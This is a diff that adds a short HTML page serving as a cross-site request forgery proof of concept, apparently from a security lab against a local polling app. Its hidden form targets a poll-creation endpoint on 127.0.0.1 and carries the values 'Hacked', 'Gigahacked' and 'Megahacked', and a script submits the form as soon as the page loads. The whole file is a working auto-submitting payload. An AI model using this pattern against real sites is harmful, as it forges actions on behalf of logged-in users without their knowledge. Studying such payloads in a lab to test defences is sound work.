@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+    <p>You've been got</p>
+    <form action='http://127.0.0.1:8000/commit-create-poll' method='POST'>
+        <input type='hidden' name='title' value='Hacked'>
+        <input type='hidden' name='choice' value='Gigahacked'>
+        <input type='hidden' name='choice' value='Megahacked'>
+</html>
+<script>
+    document.forms[0].submit()
+</script>
